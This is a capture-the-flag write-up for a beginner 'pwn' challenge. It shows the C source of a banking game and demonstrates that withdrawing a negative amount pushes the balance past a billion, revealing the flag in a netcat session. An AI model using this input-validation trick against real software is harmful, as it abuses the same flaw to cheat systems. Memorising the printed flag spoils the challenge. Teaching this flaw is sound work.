# Simple

Category: pwn

Points: 62

Solves: 47

> Simple game right?

```c
#include <stdio.h>
#include <stdlib.h>

// cc simple.c -o simple -fstack-protector-all
int main(void)
{
	puts("Want a flag? Just play until you win!");
	puts("Goal: Become a billionaire!");
	int account_value = 1000000;
	while (account_value < 1000000000) {
		printf("\nAccount value: $%d\n", account_value);
		puts("Commands:");
		puts("1. Withdraw money");
		puts("2. Deposit money");
		printf("Choose an option [1/2]: ");
		int option = 0;
		scanf("%d", &option);
		while (option != 1 && option != 2) {
			puts("Invalid option!");
			printf("Choose an option [1/2]: ");
			scanf("%d", &option);
		}
		if (option == 1) {
			printf("Amount to withdraw: ");
			int withdrawal = 0;
			scanf("%d", &withdrawal);
			account_value -= withdrawal;
		} else {
			puts("LOL no you are not allowed to deposit money. :(");
		}
	}
	printf("\nAccount value: $%d\n", account_value);
	system("cat flag");
	return 0;
}
```

At the start of the game, our account's value is `1000000`. However, we can only withdraw money, so how can we get our account value above `1000000000` to get the flag??

Let's look at the code in a bit more detail:

 ```c
 if (option == 1) {
     printf("Amount to withdraw: ");
     int withdrawal = 0;
     scanf("%d", &withdrawal);
     account_value -= withdrawal;
 }
 ```

When the withdraw option is selected, the program `scanf`s an integer. This reads an integer from the user. This integer is then subtracted from the account value. Sounds normal right? Well, we must remember that integers can be negative too! When we subtract a negative number from a number, the result is greater than the original number.

Since our current balance is `1000000`, if we subtract `-999000010`, we will get `1000000010` which is more than is required to get the flag. 

```
➜  ~ nc challs.sieberrsec.tech 8862
Want a flag? Just play until you win!
Goal: Become a billionaire!

Account value: $1000000
Commands:
1. Withdraw money
2. Deposit money
Choose an option [1/2]: 1
Amount to withdraw: -999000010

Account value: $1000000010
IRS{W377_D0NE_40U_G3N1u5_WBVAVEF}
```

Alternately, we could withdraw enough money such that the integer underflows, but that requires more math and is more complicated. 